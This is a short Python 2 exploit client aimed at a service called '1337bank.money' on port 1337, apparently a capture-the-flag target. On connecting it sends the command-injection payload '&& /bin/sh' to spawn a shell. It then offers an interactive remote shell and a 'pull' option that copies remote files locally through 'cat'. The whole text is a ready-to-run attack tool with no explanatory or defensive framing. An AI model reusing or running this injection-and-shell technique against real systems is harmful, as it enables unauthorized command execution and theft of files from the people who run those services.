#!/usr/bin/python2

import socket

host = "1337bank.money"
port = 1337

def main():
    cmd = raw_input('menu@1337bank:~# ')
    if cmd == 'shell':
        execute_cmd(cmd)
    elif cmd == 'quit':
        exit()
    elif "pull" in cmd:
        execute_cmd(cmd)
    else:
        print("shell: gets an interactive shell")
        print('pull <remote> <local>: gets a file')
        print('help: shows this menu')
        print('quit: exits')


def execute_cmd(cmd):
    dir = ['/']
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    data = s.recv(1024)
    s.send('&& /bin/sh\n')
    data = s.recv(1024)

    if cmd == 'shell':
        while cmd != 'exit':
            cmd = raw_input(("shell@1337bank:~" + "".join(dir) + '# '))
            print("Sending command: " + cmd)
            s.send((cmd + '\n'))

            if not "cd" in cmd and not "clear" in cmd:
                print(s.recv(1024))
            else:
                dir.append(cmd[3:] + '/')
        print(s.recv(1024))
    else:
        s.send(('cat ' + cmd.split(" ")[1] + '\n'))
        data = s.recv(1024)
        file = open(cmd.split(" ")[2], 'w+')
        file.write(data)
        file.close()
main()
